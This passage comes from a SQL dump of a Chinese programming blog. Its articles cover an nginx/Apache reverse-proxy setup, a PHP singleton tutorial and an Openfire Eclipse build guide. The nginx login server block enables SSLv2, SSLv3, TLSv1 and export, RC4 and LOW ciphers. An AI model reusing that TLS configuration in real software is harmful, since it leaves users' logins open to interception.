  \r\n           \r\naccess_log  logs/buyer.log  test_com;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\n#seller.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  seller.test.com;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass      http://bspsellersvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/seller.log  test_com;   \r\n           \r\n}   \r\n           \r\n#wsi.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  wsi.test.com;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass      http://bspwsisvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/wsi.log  test_com;   \r\n           \r\n}   \r\n           \r\n#www.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  www.test.com   *.test.com;   \r\n           \r\nlocation ~ ^/NginxStatus/ {   \r\n           \r\nstub_status on;   \r\n           \r\naccess_log off;   \r\n           \r\n}   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass      http://bspfrontsvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/www.log  test_com;   \r\n           \r\nerror_page   500 502 503 504  /50x.html;   \r\n           \r\nlocation = /50x.html {   \r\n           \r\nroot   html;   \r\n           \r\n}   \r\n           \r\n}   \r\n           \r\n#login.test.com   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:443;   \r\n           \r\nserver_name  login.test.com;   \r\n           \r\nssl                  on;   \r\n           \r\nssl_certificate      cert.pem;   \r\n           \r\nssl_certificate_key  cert.key;   \r\n           \r\nssl_session_timeout  5m;   \r\n           \r\nssl_protocols  SSLv2 SSLv3 TLSv1;   \r\n           \r\nssl_ciphers  ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;   \r\n           \r\nssl_prefer_server_ciphers   on;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass        https://bsploginsvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/login.log  test_com;   \r\n           \r\n}   \r\n           \r\n#login.test.com for register   \r\n           \r\nserver {   \r\n           \r\nlisten       10.10.10.230:80;   \r\n           \r\nserver_name  login.test.com;   \r\n           \r\nlocation / {   \r\n           \r\nproxy_pass        http://bspregistersvr;   \r\n           \r\ninclude         proxy_setting.conf;   \r\n           \r\n}   \r\n           \r\naccess_log  logs/register.log  test_com;   \r\n           \r\n}   \r\n           \r\n            \r\n           \r\n}   \r\n           \r\n&amp;lt;conf/proxy_setting.conf&amp;gt;   \r\n           \r\nproxy_redirect          off;   \r\n           \r\nproxy_set_header        Host $host;   \r\n           \r\nproxy_set_header        X-Real-IP $remote_addr;   \r\n           \r\nproxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;   \r\n           \r\nclient_max_body_size    10m;   \r\n           \r\nclient_body_buffer_size 128k;   \r\n           \r\nproxy_connect_timeout   90;   \r\n           \r\nproxy_send_timeout      90;   \r\n           \r\nproxy_read_timeout      90;   \r\n           \r\nproxy_buffer_size       4k;   \r\n           \r\nproxy_buffers           4 32k;   \r\n           \r\nproxy_busy_buffers_size 64k;   \r\n           \r\nproxy_temp_file_write_size 64k;   \r\n           \r\nmod_proxy的例子：   \r\n           \r\n            \r\n           \r\n&amp;lt;VirtualHost *&amp;gt;   \r\n           \r\nServerName www.zxsv.com   \r\n           \r\nServerAdmin admin@zxsv.com   \r\n           \r\n# reverse proxy setting   \r\n           \r\nProxyPass / http://www.zxsv.com:8080/   \r\n           \r\nProxyPassReverse / http://www.zxsv.com:8080/   \r\n           \r\n# cache dir root   \r\n           \r\nCacheRoot &ldquo;/var/www/proxy&rdquo;   \r\n           \r\n# max cache storage   \r\n           \r\nCacheSize 50000000   \r\n           \r\n# hour: every 4 hour   \r\n           \r\nCacheGcInterval 4   \r\n           \r\n# max page expire time: hour   \r\n           \r\nCacheMaxExpire 240   \r\n           \r\n# Expire time = (now &ndash; last_modified) * CacheLastModifiedFactor   \r\n           \r\nCacheLastModifiedFactor 0.1   \r\n           \r\n# defalt expire tag: hour   \r\n           \r\nCacheDefaultExpire 1   \r\n           \r\n# force complete after precent of content retrived: 60-90%   \r\n           \r\nCacheForceCompletion 80   \r\n           \r\nCustomLog /usr/local/apache/logs/dev_access_log combined   \r\n           \r\n&amp;lt;/VirtualHost&amp;gt;&lt;/pre&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;而SQUID的例子我就不说明了，这方面网上有写的太多，大家自己搜索一下&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;strong&gt;DNS轮询：&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;BIND是一款开放源码的DNS服务器软件，这个要说起来就大了，自己搜索去，大家知道有这个东西就行了。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;我知道的有chinacache 等大站就是这样做的，说简单点就是多服务器啦，把同一个页面或文件缓存到不同的服务器上，按南北自动解析到相关的服务器中。&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;margin:14px auto;font-family:verdana,arial,helvetica,sans-serif;line-height:21px&quot;&gt;参考链接：&lt;a target=&quot;_blank&quot; href=&quot;http://web.itivy.com/article-305-1.html&quot;&gt;http://web.itivy.com/article-305-1.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386858882),
(80, 80, '&lt;p&gt;单例模式比较好理解，看看介绍，然后看看代码基本也就能够理解了，设计模式这些的花点心思基本的是能够理解的，当然要想很好的运用到项目上也是需要一定的实践，不能只是知道了解，或者说的是很厉害很懂的，一到要实际操作就不行了，废话就不多说了，PHP战线上的同志们都加油吧；&lt;br /&gt;&lt;br /&gt;单例模式（职责模式）： &lt;br /&gt;&lt;br /&gt;简单的说，一个对象（在学习设计模式之前，需要比较了解面向对象思想）只负责一个特定的任务； &lt;br /&gt;&lt;br /&gt;单例类： &lt;br /&gt;&lt;br /&gt;1、构造函数需要标记为private（访问控制：防止外部代码使用new操作符创建对象），单例类不能在其他类中实例化，只能被其自身实例化； &lt;br /&gt;&lt;br /&gt;2、拥有一个保存类的实例的静态成员变量 &lt;br /&gt;&lt;br /&gt;3、拥有一个访问这个实例的公共的静态方法（常用getInstance()方法进行实例化单例类，通过instanceof操作符可以检测到类是否已经被实例化） &lt;br /&gt;&lt;br /&gt;另外，需要创建__clone()方法防止对象被复制（克隆） &lt;br /&gt;&lt;br /&gt;为什么要使用PHP单例模式？ &lt;br /&gt;&lt;br /&gt;1、php的应用主要在于数据库应用, 所以一个应用中会存在大量的数据库操作, 使用单例模式, 则可以避免大量的new 操作消耗的资源。 &lt;br /&gt;&lt;br /&gt;2、如果系统中需要有一个类来全局控制某些配置信息, 那么使用单例模式可以很方便的实现. 这个可以参看ZF的FrontController部分。 &lt;br /&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;3、在一次页面请求中, 便于进行调试, 因为所有的代码(例如数据库操作类db)都集中在一个类中, 我们可以在类中设置钩子, 输出日志，从而避免到处var_dump, echo。&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n /**\r\n * 设计模式之单例模式\r\n * $_instance必须声明为静态的私有变量\r\n * 构造函数和析构函数必须声明为私有,防止外部程序new\r\n * 类从而失去单例模式的意义\r\n * getInstance()方法必须设置为公有的,必须调用此方法\r\n * 以返回实例的一个引用\r\n * ::操作符只能访问静态变量和静态函数\r\n * new对象都会消耗内存\r\n * 使用场景:最常用的地方是数据库连接。\r\n * 使用单例模式生成一个对象后，\r\n * 该对象可以被其它众多对象所使用。\r\n */ \r\n class Danli { \r\n      \r\n //保存类实例的静态成员变量 \r\n private static $_instance; \r\n      \r\n //private标记的构造方法 \r\n private function __construct(){ \r\n echo &#039;This is a Constructed method;&#039;; \r\n } \r\n      \r\n //创建__clone方法防止对象被复制克隆 \r\n public function __clone(){ \r\n trigger_error(&#039;Clone is not allow!&#039;,E_USER_ERROR); \r\n } \r\n      \r\n //单例方法,用于访问实例的公共的静态方法 \r\n public static function getInstance(){ \r\n if(!(self::$_instance instanceof self)){ \r\n self::$_instance = new self; \r\n } \r\n return self::$_instance; \r\n } \r\n      \r\n public function test(){ \r\n echo &#039;调用方法成功&#039;; \r\n } \r\n      \r\n } \r\n      \r\n //用new实例化private标记构造函数的类会报错 \r\n //$danli = new Danli(); \r\n      \r\n //正确方法,用双冒号::操作符访问静态方法获取实例 \r\n $danli = Danli::getInstance(); \r\n $danli-&amp;gt;test(); \r\n      \r\n //复制(克隆)对象将导致一个E_USER_ERROR \r\n $danli_clone = clone $danli;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386858965);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(81, 81, '&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;环境安装&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;开发环境(IDE)：openfire -3.8.2 &amp;nbsp;+ &amp;nbsp;eclipse-jee-juno-SR2-win32 &amp;nbsp;+ &amp;nbsp;jdk-1.7&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;1、获取openfire源码：&lt;a target=&quot;_blank&quot; href=&quot;http://www.igniterealtime.org/downloads/source.jsp&quot;&gt;http://www.igniterealtime.org/downloads/source.jsp&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;tt&gt;&lt;br /&gt;&lt;/tt&gt;&lt;/p&gt;&lt;p&gt;2、创建openfire工程&lt;/p&gt;&lt;p&gt;将SVN检出的openfire源码导出到eclipse的本地工程目录文件夹openfire中&lt;br /&gt;openfire目录下，除READEME.html、LICENSE.html和changelog.html三个网页文件外，有如下四个子目录：&lt;br /&gt;build　　　　　生成安装文件所需要的的一些文件，如JRE等。&lt;br /&gt;resources　　　为实现国际化（i18n）和本地化的一些编码文件。&lt;br /&gt;documentation　关于Openfire安装和配置的信息，Openfire的Javadoc。&lt;br /&gt;src　　　　　　Openfire的源代码目录，这下面又有许多文件夹，其中Java文件夹是实现Openfire核心功能的存放目录，通过它就可以调试Openfire&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;3. 从现有资源新建项目&lt;br /&gt;(1) 文件-&amp;gt;新建-&amp;gt;JAVA项目&lt;/p&gt;从现有Ant构建文件创建Java项目&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386859246_1lilya_8809_20130612175548890.png&quot; title=&quot;20130612175548890.png&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;(2) 在弹出的窗口中，点击浏览，找到前面导出的openfire中的build.xml，选中点击完成会创建openfire的项目工程&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386859282_svc3f6_4585_20130612175959000.png&quot; title=&quot;20130612175959000.png&quot; /&gt;&lt;/p&gt;&lt;p&gt;4. 编译工程&lt;br /&gt;openfire是用ant构建的，所以要先设置使得eclipse中每次编译都使用内置的ant工具，保证编译的正确执行。同时，要在Eclipse中设置为使用JDK作为JVM，如果使用JRE作为JVM，编译就会失败。&lt;br /&gt;因为openfire在Windows下是使用install4j打包成.exe格式的安装文件的，所以需要安装install4j。否则，在使用ant进行编译的时候，在ant视图中可能会出现警告如下信息：taskdef class com.install4j.install4jtask cannot found。这主要是要安装用来打包Java应用程序的install4j.exe程序，而且将要安装到其默认的安装路径C:Program Filesinstall4j下。&lt;br /&gt;(1) 在eclipse中点击Window-&amp;gt;Show View-&amp;gt;Ant，打开Ant窗口&lt;br /&gt;(2) 在Ant 视图中，单击右键，在弹出的快捷菜单中选择Add Buildfiles..&lt;br /&gt;(3) 在弹出的对话框中，展开openfire_src/build文件夹，选择build目录下的build.xml，点击OK&lt;br /&gt;(4) 在Ant视图中, 展开Openfire XMPP Server，双击 openfire_src（default）编译工程&lt;br /&gt;(4) 如果在Console视图中显示&ldquo;BUILD SUCCESSFUL&rdquo;就表示编译成功&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;5. 创建项目Builder&lt;br /&gt;(1) 在eclipse的菜单栏中，选择Run-&amp;gt;Open Run Dialog...，在弹出的对话框左侧的树形结构中选择Java Application，单击右键，选择New创建启动配置&lt;br /&gt;(2) 在Run窗口的Main选项卡中, 修改Name文本框中的值，改成包含要启动的类的工程名openfire_src&lt;br /&gt;(3) 在Run窗口的Main选项卡中，点Browse按钮，选择openfire_src&lt;br /&gt;(4) 在Run窗口的Main选项卡中，点Search按钮，选择Main class为org.jivesoftware.openfire.starter.ServerStarter，单击Apply按钮。（这是openfire的启动类）&lt;br /&gt;(5) 点击进入Arguments选项卡，在VM arguments文本框中输入&lt;br /&gt;-DopenfireHome=&amp;quot;${workspace_loc:openfire}/target/openfire&amp;quot;&lt;br /&gt;单击Apply按钮。&lt;br /&gt;这个是用于eclipse执行java命令时传递的参数，这样openfire程序可以通过System.getProperty(&ldquo;openfireHome&rdquo;)得到openfire的本地位置。&lt;br /&gt;(6) 点击进入Classpath选项卡，选中User Entries，这样Advanced...就处于可用状态；点击Advanced...按钮，在Advanced Options页面，选择Add Folders, 单击OK。（默认情况下，已经将工程openfire添加到了这里，而不需要进行该项操作，如果有多个工程的时候才需要执行该项操作。）选择openfire_srcsrci18n, 点OK按钮将这个文件夹加入到Classpath选项卡中；同样的方式把openfire_srcsrc\resourcesjar目录也加到Classpath选项卡中。&lt;br /&gt;(7) 在Common选项卡中，勾选Run复选框，单击Apply按钮。&lt;br /&gt;设置完毕，这样以后在run这个工程的时候就会按照正确的配置进行了，debug的设置和run的设置类似，不用多说。&lt;/p&gt;&lt;br /&gt;6. 运行并测试编译结果（openfire服务器）&lt;br /&gt;(1) 在Eclipse菜单中，单击Run-&amp;gt;Run（或快捷方式Ctrl+F11），在Console试图中出现如下所示的信息。&lt;br /&gt;(2) 在Web浏览器中，输入http://127.0.0.1:9090/，如果可以出现配置的openfire的页面，就表示openfire编译、运行成功。&lt;br /&gt;&lt;br /&gt;7. 自己定制openfire服务器时，在Eclipse对openfire源代码进行部署&lt;br /&gt;openfire 的起始类为org.jivesoftware.openfire.starter.ServerStarter.java，但是直接运行此类却有问题，因为此类是针对Openfire安装包而设计的，此类的功能是将所用到的JAR文件解压并将class文件加载到虚拟机中，而我们要用的却是源代码中我们自己编译好的class文件。所以，我们需要一个新的启动类。&lt;pre class=&quot;brush:java;toolbar:false;&quot;&gt;package org.jivesoftware.openfire.starter; \r\n                   \r\nimport org.jivesoftware.openfire.XMPPServer; \r\n                   \r\npublic class StandaloneStarter { \r\n    public static void main(String[] args) { \r\n        XMPPServer server = new XMPPServer(); \r\n    } \r\n}&lt;/pre&gt;&lt;p&gt;这样程序就可以跑起来了，最后的问题就是配置文件路径的问题。&lt;br /&gt;a) 在StandaloneStarter类的启动选项(VM arguments)中加入-DopenfireHome=&amp;quot;${workspace_loc:openfire}/target/openfire&amp;quot;，具体方法参见上文。&lt;br /&gt;b) 点击进入Classpath选项卡，选中User Entries，这样Advanced...就处于可用状态；点击Advanced...按钮，在Advanced Options页面，选择Add Folders, 单击OK。（默认情况下，已经将工程openfire添加到了这里，而不需要进行该项操作，如果有多个工程的时候才需要执行该项操作。）选择 openfire_srcsrci18n, 点OK按钮将这个文件夹加入到Classpath选项卡中；同样的方式把openfire_srcsrc\resourcesjar目录也加到 Classpath选项卡中。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;********************************************************************************************&lt;br /&gt;另:&lt;br /&gt;使用Eclipse的版本控制插件SVN获取（检出为），具体步骤为：&lt;br /&gt;1. 在eclipse中，选择Windows-&amp;gt;Open Perspective-&amp;gt;Other&lt;br /&gt;2. 在弹出的窗口中，选择SVN Repository Exploring, 然后点OK&lt;br /&gt;3. 在SVN Repositories 视图中单击右键，选择 New-&amp;gt;Repository Location...&lt;br /&gt;4. 在弹出的New Repository Location对话框的输入URL文本框中输入：http://svn.igniterealtime.org/svn/repos/openfire/trunk，然后，单击Finish.。你将会看到页面中出现URL地址。&lt;br /&gt;5. 展开URL地址与openfire树形结构&lt;br /&gt;6. 在trunk上点击右键，选择Check Out（检出为），即可将源代码保存到您所指定的目录下。&lt;br /&gt;7. 用Create project from existing source新建工程，注意工程名要用openfire。&lt;br /&gt;&lt;br /&gt;如果您是做二次开发，为了定制自己的服务器端，就可以采用这样方法：&lt;br /&gt;1. 新建工程：File-&amp;gt;New-&amp;gt;Project-&amp;gt;Java Project，单击Next，在Project name文本框中输入工程名：openfire，单击Finish&lt;br /&gt;2. 解压后得到的openfire_srcsrc目录下所有内容复制到新建的工程目录workspaceopenfire下&lt;br /&gt;3. 在Package Explorer视图中，右击openfire工程，选择Properties，在弹出的对话框中选择Libraries-&amp;gt;Add JARs..，把openfire_src/build/lib目录下的*.jar类库全部添加进来；选择Source标签页，Add Folder..，选中src/java目录前的复选框，点击OK按钮。（在Eclipse中将此Java文件夹当成源代码文件夹新建工程，建立新工程后观察Openfire所import的包，发现Openfire用了许多开源工具，而这些库都在上文提到的Build目录的lib 目录下，将Openfire用到的库都添加到这个新建工程的Referenced Libraries中。或者如果这样一个一个添加比较麻烦的话还有一个方法就是从你安装好的Openfire服务器目录下的lib目录中（例如：&amp;quot;C:Program FilesOpenfirelib&amp;quot;或&amp;quot;/usr/local/openfire/lib&amp;quot;）找到openfire.jar，打开后将里面的org/jivesoftware删除，重新打包成jar并添加到这个新建工程的Referenced Libraries中，这样就可以省去了很多类似的工作。）但是这样新建的openfire项目没有打包部署，需要开发者自己完成相应的工作。&lt;br /&gt;注意：新建工程之后，可能会出现一些警告信息，下面对此予以说明：对于警告信息，是没有关系的。因为这些警告信息是使用1.5以上版本JDK时候才出现的，使用JDK1.4是不会出现这些警告信息的。因为这些代码中的有些是使用JDK 1.4编写的，而JDK1.4不支持泛型，而JDK 1.5和JDK1.6是支持泛型的。这些警告信息主要是提示将这些非泛型的代码修改为更加高级的方法&mdash;&mdash;泛型，所以这些警告信息是不影响代码结果的。如果需要修改为泛型也是可以，使用泛型来处理相关的集合类。&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px;color:#cc0000&quot;&gt;&lt;strong&gt;注意：提示错误如下：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;HTTP ERROR: 500&lt;/p&gt;&lt;p&gt;INTERNAL_SERVER_ERROR&lt;/p&gt;&lt;p&gt;RequestURI=/setup/index.jsp&lt;/p&gt;&lt;p&gt;Caused by:&lt;/p&gt;&lt;p&gt;java.lang.NullPointerException&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.jivesoftware.admin.AdminConsole.getAppName(AdminConsole.java:122)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.jivesoftware.openfire.admin.decorators.setup_jsp._jspService(setup_jsp.java:168)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:97)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at javax.servlet.http.HttpServlet.service(HttpServlet.java:820)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:487)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:362)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:726)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.Dispatcher.include(Dispatcher.java:192)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at com.opensymphony.module.sitemesh.filter.PageFilter.applyDecorator(PageFilter.java:156)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:59)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.jivesoftware.util.LocaleFilter.doFilter(LocaleFilter.java:66)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.jivesoftware.util.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:42)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.jivesoftware.admin.PluginFilter.doFilter(PluginFilter.java:70)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.jivesoftware.admin.AuthCheckFilter.doFilter(AuthCheckFilter.java:99)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:360)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:726)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:206)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.Server.handle(Server.java:324)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:505)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:829)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:514)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:211)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:380)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:395)&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:488)&lt;/p&gt;&lt;p&gt;Powered by Jetty://&lt;/p&gt;&lt;p&gt;这时因为是文件路径所导致的问题，需要将admin-sidebar.xml和openfire_i18n_en.properties这2个文件直接放在openfire/bin目录下即可解决这个问题。&lt;/p&gt;&lt;p&gt;如果再次出现，这样的问题，就需要将openfire目录下的你把openfire下的work 和target文件都删除了，然后重新发布一个。因为web的内容不会自动更新的，只有.class会自动更新。&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考链接：&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://hi.baidu.com/no9527/item/daadb10fe107d26dd45a1191&quot;&gt;http://hi.baidu.com/no9527/item/daadb10fe107d26dd45a1191&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://wenku.baidu.com/view/a78f54513c1ec5da50e27089.html&quot;&gt;http://wenku.baidu.com/view/a78f54513c1ec5da50e27089.html&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://wenku.baidu.com/view/8acbbb305a8102d276a22fb5.html&quot;&gt;http://wenku.baidu.com/view/8acbbb305a8102d276a22fb5.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/ares1201/article/details/7737872&quot;&gt;http://blog.csdn.net/ares1201/article/details/7737872&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/ares1201/article/details/7737872&quot;&gt;&lt;/a&gt;&lt;/p&gt;', 1386859386);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(82, 82, '&lt;p&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;xml&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;version&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;1.0&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;注意: 除了手动编辑此文件以外，您还可以使用 Web 管理工具来配置应用程序的设置。可以使用 Visual Studio 中的&ldquo;网站&rdquo;-&amp;gt;&ldquo;Asp.Net 配置&rdquo;选项。&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;设置和注释的完整列表在 machine.config.comments 中，该文件通常位于 &amp;quot;Windows&amp;quot;Microsoft.Net&amp;quot;Framework&amp;quot;v2.x&amp;quot;Config 中。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;Webconfig&lt;/span&gt;&lt;span 